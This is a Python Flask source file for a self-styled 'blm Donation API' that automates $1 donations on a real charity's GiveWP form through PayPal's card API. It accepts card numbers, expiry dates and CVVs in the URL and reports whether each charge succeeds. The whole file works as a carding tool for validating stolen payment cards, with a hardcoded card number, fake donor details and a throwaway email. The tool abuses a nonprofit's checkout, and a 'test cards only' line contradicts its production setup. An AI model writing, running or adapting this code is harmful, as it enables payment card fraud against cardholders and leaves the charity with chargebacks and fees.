from flask import Flask, request, jsonify
import requests
import html
import re
from urllib.parse import urlparse, parse_qs
from faker import Faker
import random

app = Flask(__name__)

class blmDonationAPI:
    def __init__(self):
        self.session = requests.Session()
        self.fake = Faker()
        
    def create_donation(self, card_data=None, personal_info=None):
        """
        Main donation function - blm Edition
        """
        try:
            # Default data
            if not card_data:
                card_data = {
                    'number': '5523389018553010',
                    'cvv': '417', 
                    'expiry': '2028-01'
                }
            
            if not personal_info:
                personal_info = {
                    'first_name': 'John',
                    'last_name': 'David',
                    'email': 'wibase9779@safetoca.com',
                    'amount': '1',
                    'address': 'Street 14th',
                    'city': 'New york',
                    'state': 'NY',
                    'zip': '10080',
                    'country': 'US'
                }

            # STEP 1: Get form data
            headers = {
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
            }

            params = {
                'givewp-route': 'donation-form-view',
                'form-id': '264641',
                'locale': 'en_US',
            }

            response = self.session.get('https://soule-foundation.org/', params=params, headers=headers)
            html_text = response.text

            # Extract form IDs using regex only - no BeautifulSoup needed
            id_match = re.search(r'"donationFormId":\s*(\d+)', html_text)
            form_id = id_match.group(1) if id_match else "264641"

            nonce_match = re.search(r'"donationFormNonce":"(.*?)"', html_text)
            form_nonce = nonce_match.group(1) if nonce_match else ""

            m = re.search(r'"donateUrl"\s*:\s*"([^"]+)"', html_text)
            if m:
                donate_url = html.unescape(m.group(1))
                parsed = urlparse(donate_url)
                q = parse_qs(parsed.query)
                sig = q.get("givewp-route-signature", ["Not found"])[0]
                exp = q.get("givewp-route-signature-expiration", ["Not found"])[0]
            else:
                return {"success": False, "error": "donateUrl not found"}

            # STEP 2: Get PayPal token
            paypal_params = {
                'style.label': 'paypal',
                'style.layout': 'vertical',
                'style.color': 'gold',
                'style.shape': 'rect',
                'style.tagline': 'false',
                'style.menuPlacement': 'below',
                'style.shouldApplyRebrandedStyles': 'false',
                'style.isButtonColorABTestMerchant': 'false',
                'allowBillingPayments': 'true',
                'applePaySupport': 'false',
                'buttonSessionID': 'uid_e7f12c7269_mdc6mjk6mzm',
                'buttonSize': 'large',
                'customerId': '',
                'clientID': 'BAAiO5DcFkSOsyZpJ0-yk9yxs0Z-uLSP0JUrIL0BvXctlH2i-Um4VYxdxYD6hNjXwg7CeKksWHICw74fkQ',
                'clientMetadataID': 'uid_15d7e1b6c4_mdc6mtq6nti',
                'commit': 'true',
                'components.0': 'buttons',
                'components.1': 'card-fields',
                'currency': 'USD',
                'debug': 'false',
                'disableFunding.0': 'credit',
                'disableSetCookie': 'true',
                'eagerOrderCreation': 'false',
                'enableFunding.0': 'venmo',
                'env': 'production',
                'experiment.enableVenmo': 'false',
                'experiment.venmoVaultWithoutPurchase': 'false',
                'experiment.spbEagerOrderCreation': 'false',
                'experiment.venmoWebEnabled': 'false',
                'experiment.isWebViewEnabled': 'false',
                'experiment.isPaypalRebrandEnabled': 'false',
                'experiment.isPaypalRebrandABTestEnabled': 'false',
                'experiment.defaultBlueButtonColor': 'defaultBlue_lightBlue',
                'experiment.venmoEnableWebOnNonNativeBrowser': 'false',
                'flow': 'purchase',
                'fundingEligibility': 'eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sInBheWxhdGVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjpmYWxzZSwicHJvZHVjdHMiOnsicGF5SW4zIjp7ImVsaWdpYmxlIjpmYWxzZSwidmFyaWFudCI6bnVsbH0sInBheUluNCI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9fX0sImNhcmQiOnsiZWxpZ2libGUiOnRydWUsImJyYW5kZWQiOmZhbHNlLCJpbnN0YWxsbWVudHMiOmZhbHNlLCJ2ZW5kb3JzIjp7InZpc2EiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sIm1hc3RlcmNhcmQiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImFtZXgiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImRpc2NvdmVyIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJoaXBlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2V9LCJlbG8iOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJqY2IiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJtYWVzdHJvIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJkaW5lcnMiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImN1cCI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiY2JfbmF0aW9uYWxlIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6ZmFsc2V9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2V9LCJpdGF1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImNyZWRpdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJhcHBsZXBheSI6eyJlbGlnaWJsZSI6dHJ1ZX0sInNlcGEiOnsiZWxpZ2libGUiOmZhbHNlfSwiaWRlYWwiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmFuY29udGFjdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJnaXJvcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImVwcyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzb2ZvcnQiOnsiZWxpZ2libGUiOmZhbHNlfSwibXliYW5rIjp7ImVsaWdpYmxlIjpmYWxzZX0sInAyNCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ3ZWNoYXRwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGF5dSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJibGlrIjp7ImVsaWdpYmxlIjpmYWxzZX0sInRydXN0bHkiOnsiZWxpZ2libGUiOmZhbHNlfSwib3h4byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG8iOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvYmFuY2FyaW8iOnsiZWxpZ2libGUiOmZhbHNlfSwibWVyY2Fkb3BhZ28iOnsiZWxpZ2libGUiOmZhbHNlfSwibXVsdGliYW5jbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzYXRpc3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYWlkeSI6eyJlbGlnaWJsZSI6ZmFsc2V9fQ',
                'intent': 'capture',
                'jsSdkLibrary': 'paypal-js',
                'locale.country': 'IN',
                'locale.lang': 'en',
                'hasShippingCallback': 'false',
                'platform': 'mobile',
                'renderedButtons.0': 'paypal',
                'sessionID': 'uid_15d7e1b6c4_mdc6mtq6nti',
                'sdkCorrelationID': 'f915935bed8b3',
                'sdkMeta': 'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9pbnRlbnQ9Y2FwdHVyZSZ2YXVsdD1mYWxzZSZjdXJyZW5jeT1VU0QmY2xpZW50LWlkPUJBQWlPNURjRmtTT3N5WnBKMC15azl5eHMwWi11TFNQMEpVcklMMEJ2WGN0bEgyaS1VbTRWWXhkeFlENmhOalh3ZzdDZUtrc1dISUN3NzRma1EmZGlzYWJsZS1mdW5kaW5nPWNyZWRpdCZjb21wb25lbnRzPWJ1dHRvbnMsY2FyZC1maWVsZHMmZW5hYmxlLWZ1bmRpbmc9dmVubW8iLCJhdHRycyI6eyJkYXRhLXNkay1pbnRlZ3JhdGlvbi1zb3VyY2UiOiJyZWFjdC1wYXlwYWwtanMiLCJkYXRhLXBhcnRuZXItYXR0cmlidXRpb24taWQiOiJHaXZlV1BfU1BfUFBDUFYyIiwiZGF0YS11aWQiOiJ1aWRfaXNvY2x0aHRocHNzZWd1Z3Npam5vbWVta2NhbXBuIn19',
                'sdkVersion': '5.0.502',
                'storageID': 'uid_a0414e081a_mdc6mtq6nti',
                'buttonColor.shouldApplyRebrandedStyles': 'false',
                'buttonColor.color': 'gold',
                'buttonColor.isButtonColorABTestMerchant': 'false',
                'supportedNativeBrowser': 'true',
                'supportsPopups': 'true',
                'vault': 'false',
            }

            response = self.session.get('https://www.paypal.com/smart/buttons', params=paypal_params, headers=headers)
            html_text = response.text

            match = re.search(r'"facilitatorAccessToken"\s*:\s*"([^"]+)"', html_text)
            token = match.group(1) if match else ""

            # STEP 3: Create order
            headers = {
                'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
            }

            params = {
                'action': 'give_paypal_commerce_create_order',
            }

            data = {
                'give-form-id': form_id,
                'give-form-hash': form_nonce,
                'give_payment_mode': 'paypal-commerce',
                'give-amount': personal_info['amount'],
                'give_first': personal_info['first_name'],
                'give_last': personal_info['last_name'],
                'give_email': personal_info['email'],
                'card_address': personal_info['address'],
                'card_city': personal_info['city'],
                'card_state': personal_info['state'],
                'card_zip': personal_info['zip'],
                'billing_country': personal_info['country'],
            }

            response = self.session.post(
                'https://soule-foundation.org/wp-admin/admin-ajax.php',
                params=params,
                headers=headers,
                data=data,
            )

            order_data = response.json()
            order_id = order_data["data"]["id"]

            # STEP 4: Confirm payment
            headers = {
                'authorization': f'Bearer {token}',
                'content-type': 'application/json',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
            }

            json_data = {
                'payment_source': {
                    'card': {
                        'number': card_data['number'],
                        'security_code': card_data['cvv'],
                        'expiry': card_data['expiry'],
                    },
                },
            }

            response = self.session.post(
                f'https://www.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
                headers=headers,
                json=json_data,
            )

            # STEP 5: Finalize donation
            headers = {
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
            }

            params = {
                'givewp-route': 'donate',
                'givewp-route-signature': sig,
                'givewp-route-signature-id': 'givewp-donate',
                'givewp-route-signature-expiration': exp,
            }

            data = {
                'amount': personal_info['amount'],
                'currency': 'USD',
                'donationType': 'single',
                'formId': '264641',
                'gatewayId': 'paypal-commerce',
                'firstName': personal_info['first_name'],
                'lastName': personal_info['last_name'],
                'email': personal_info['email'],
                'country': personal_info['country'],
                'address1': personal_info['address'],
                'city': personal_info['city'],
                'state': personal_info['state'],
                'zip': personal_info['zip'],
                'gatewayData[payPalOrderId]': order_id,
            }

            response = self.session.post(
                'https://soule-foundation.org/', 
                params=params, 
                headers=headers, 
                data=data
            )

            return {
                "success": True,
                "order_id": order_id,
                "status": "Donation processed by blm",
                "response": response.text
            }

        except Exception as e:
            return {
                "success": False,
                "error": f"blm API Error: {str(e)}"
            }

# Create API instance
blm_api = blmDonationAPI()

# 🔥 URL CARD PROCESSING ENDPOINTS 🔥
@app.route('/cc=<path:card_details>')
def process_card_via_url(card_details):
    """
    Process donation via URL parameters
    Format: /cc=card|mm|yy|cvv
    Example: /cc=5523389018553010|01|28|417
    """
    try:
        # Parse card details from URL
        parts = card_details.split('|')
        
        if len(parts) != 4:
            return jsonify({
                "success": False,
                "error": "Invalid format. Use: /cc=card|mm|yy|cvv",
                "example": "/cc=5523389018553010|01|28|417"
            })
        
        card_number = parts[0].strip()
        exp_month = parts[1].strip()
        exp_year = parts[2].strip()
        cvv = parts[3].strip()
        
        # Validate card number
        if not card_number.isdigit() or len(card_number) < 15:
            return jsonify({
                "success": False,
                "error": "Invalid card number"
            })
        
        # Prepare card data
        card_data = {
            'number': card_number,
            'cvv': cvv,
            'expiry': f"20{exp_year}-{exp_month}"
        }
        
        # Default personal info
        personal_info = {
            'first_name': 'John',
            'last_name': 'David',
            'email': 'wibase9779@safetoca.com',
            'amount': '1',
            'address': 'Street 14th',
            'city': 'New york',
            'state': 'NY',
            'zip': '10080',
            'country': 'US'
        }
        
        # Process donation
        result = blm_api.create_donation(card_data, personal_info)
        
        # Format response
        response_data = {
            "success": result.get("success", False),
            "card": f"{card_number[:6]}******{card_number[-4:]}",
            "amount": "$1",
            "status": result.get("status", ""),
            "order_id": result.get("order_id", ""),
            "error": result.get("error", "")
        }
        
        return jsonify(response_data)
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": f"URL processing error: {str(e)}"
        })

@app.route('/cc=<path:card_details>/amount/<amount>')
def process_card_with_amount(card_details, amount):
    """
    Process donation with custom amount via URL
    Format: /cc=card|mm|yy|cvv/amount/5
    Example: /cc=5523389018553010|01|28|417/amount/5
    """
    try:
        # Parse card details
        parts = card_details.split('|')
        
        if len(parts) != 4:
            return jsonify({
                "success": False,
                "error": "Invalid format. Use: /cc=card|mm|yy|cvv/amount/5"
            })
        
        card_number = parts[0].strip()
        exp_month = parts[1].strip()
        exp_year = parts[2].strip()
        cvv = parts[3].strip()
        
        # Prepare card data
        card_data = {
            'number': card_number,
            'cvv': cvv,
            'expiry': f"20{exp_year}-{exp_month}"
        }
        
        # Custom amount
        personal_info = {
            'first_name': 'John',
            'last_name': 'David',
            'email': 'wibase9779@safetoca.com',
            'amount': amount,
            'address': 'Street 14th',
            'city': 'New york',
            'state': 'NY',
            'zip': '10080',
            'country': 'US'
        }
        
        # Process donation
        result = blm_api.create_donation(card_data, personal_info)
        
        response_data = {
            "success": result.get("success", False),
            "card": f"{card_number[:6]}******{card_number[-4:]}",
            "amount": f"${amount}",
            "status": result.get("status", ""),
            "order_id": result.get("order_id", ""),
            "error": result.get("error", "")
        }
        
        return jsonify(response_data)
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": f"URL processing error: {str(e)}"
        })

# 🔥 blm API ROUTES 🔥
@app.route('/blm/donate', methods=['POST'])
def blm_process_donation():
    """
    blm Donation Endpoint - Process donation via POST
    """
    try:
        data = request.get_json()
        card_data = data.get('card')
        personal_info = data.get('personal_info')
        
        result = blm_api.create_donation(card_data, personal_info)
        return jsonify(result)
        
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route('/blm/health', methods=['GET'])
def blm_health_check():
    return jsonify({"status": "🔥 blm API is running strong"})

@app.route('/blm/info', methods=['GET'])
def blm_info():
    return jsonify({
        "api_name": "blm Donation API",
        "version": "2.0",
        "developer": "blm", 
        "features": [
            "URL Parameter Processing",
            "POST API Endpoints", 
            "Custom Amount Support",
            "Real Payment Processing"
        ],
        "url_formats": {
            "basic": "/cc=card|mm|yy|cvv",
            "with_amount": "/cc=card|mm|yy|cvv/amount/5",
            "post_api": "POST /blm/donate"
        },
        "example_urls": [
            "/cc=5523389018553010|01|28|417",
            "/cc=5523389018553010|01|28|417/amount/5"
        ]
    })

@app.route('/blm')
def blm_home():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>🔥 blm Donation API</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; background: #000; color: #fff; }
            h1 { color: #ff0000; }
            .endpoint { background: #222; padding: 15px; margin: 15px 0; border-left: 4px solid #ff0000; }
            .code { background: #333; padding: 10px; font-family: monospace; margin: 10px 0; }
            a { color: #ff4444; text-decoration: none; }
            a:hover { text-decoration: underline; }
        </style>
    </head>
    <body>
        <h1>🔥 blm Donation API v2.0 🔥</h1>
        <p><em>URL Parameter Payment Processing System</em></p>
        
        <h2>🎯 Quick Start URLs:</h2>
        
        <div class="endpoint">
            <strong>GET /cc=card|mm|yy|cvv</strong><br>
            Process $1 donation with card details in URL
            <div class="code">
            Example: <a href="/cc=5523389018553010|01|28|417" target="_blank">/cc=5523389018553010|01|28|417</a>
            </div>
        </div>
        
        <div class="endpoint">
            <strong>GET /cc=card|mm|yy|cvv/amount/5</strong><br>
            Process custom amount donation
            <div class="code">
            Example: <a href="/cc=5523389018553010|01|28|417/amount/5" target="_blank">/cc=5523389018553010|01|28|417/amount/5</a>
            </div>
        </div>
        
        <h2>📡 API Endpoints:</h2>
        <div class="endpoint">
            <strong>POST /blm/donate</strong><br>
            JSON API endpoint for advanced usage
        </div>
        
        <div class="endpoint">
            <strong>GET /blm/health</strong><br>
            Check API status
        </div>
        
        <div class="endpoint">
            <strong>GET /blm/info</strong><br>
            API information
        </div>
        
        <p><strong>⚡ Powered by blm - Professional Payment Processing</strong></p>
    </body>
    </html>
    '''

@app.route('/')
def home():
    return '''
    <h1>🔥 blm API Server</h1>
    <p>Go to <a href="/blm">/blm</a> for complete API documentation</p>
    
    <h3>🚀 Quick Test Links:</h3>
    <ul>
        <li><a href="/cc=5523389018553010|01|28|417">Test $1 Donation</a></li>
        <li><a href="/cc=5523389018553010|01|28|417/amount/2">Test $2 Donation</a></li>
        <li><a href="/blm/health">API Health Check</a></li>
    </ul>
    
    <p><em>Real payment processing - Use test cards only</em></p>
    '''

if __name__ == '__main__':
    print("🔥 blm URL Donation API Starting...")
    print("🎯 URL Endpoints:")
    print("   http://localhost:5000/cc=card|mm|yy|cvv")
    print("   http://localhost:5000/cc=card|mm|yy|cvv/amount/5")
    print("   http://localhost:5000/blm/donate (POST)")
    print("   http://localhost:5000/blm")
    print("   http://localhost:5000/blm/health")
    print("\n⚡ Server running on http://localhost:5000")
    app.run(host='0.0.0.0', port=5000, debug=True)
